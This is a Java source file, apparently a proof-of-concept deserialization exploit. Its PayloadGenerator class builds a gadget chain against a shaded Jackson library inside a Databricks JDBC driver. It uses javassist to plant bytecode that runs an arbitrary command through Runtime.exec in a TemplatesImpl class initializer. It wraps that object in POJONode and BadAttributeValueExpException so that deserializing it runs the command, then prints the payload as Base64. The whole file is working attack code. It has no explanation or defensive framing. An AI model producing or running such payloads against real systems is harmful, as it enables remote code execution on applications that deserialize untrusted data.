package gadget;

import com.databricks.client.jdbc.internal.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

public class PayloadGenerator {

    public static Object getPayload() throws Exception {
        // 1. Generate standard TemplatesImpl (RCE Gadget)
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.databricks.client.jdbc.internal.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            jsonNode.removeMethod(writeReplace);
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(cl, null);
        } catch (Exception ignored) {
            System.out.println(ignored);
        }

        byte[] code1 = getTemplateCode("calc");

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "MHGA");
        setFieldValue(templates, "_bytecodes", new byte[][]{code1});
        setFieldValue(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());
        setFieldValue(templates, "_transletIndex", 0);

        // 2. Wrap via POJONode (Trigger: toString -> getter)
        POJONode node = new POJONode(templates);

        // 3. Wrap via BadAttributeValueExpException (Trigger: readObject -> toString)
        BadAttributeValueExpException badAttribute = new BadAttributeValueExpException(null);
        setFieldValue(badAttribute, "val", node);
        return badAttribute;
    }

    public static byte[] serialize(Object obj, boolean printBase64) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        if (printBase64) {
            System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
        }
        return baos.toByteArray();
    }

    public static byte[] getTemplateCode(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        // Create a unique class name to avoid conflicts
        CtClass template = pool.makeClass("EvilTemplates_" + System.nanoTime());
        template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        // Execute cmd in static block or constructor
        String block = "java.lang.Runtime.getRuntime().exec(\"" + cmd + "\");";
        template.makeClassInitializer().insertBefore(block);

        return template.toBytecode();
    }

    public static void setFieldValue(Object obj, String fieldName, Object val) throws Exception {
        Field f = null;
        Class<?> c = obj.getClass();
        while (c != null) {
            try {
                f = c.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        if (f == null) throw new NoSuchFieldException(fieldName);
        f.setAccessible(true);
        f.set(obj, val);
    }
}
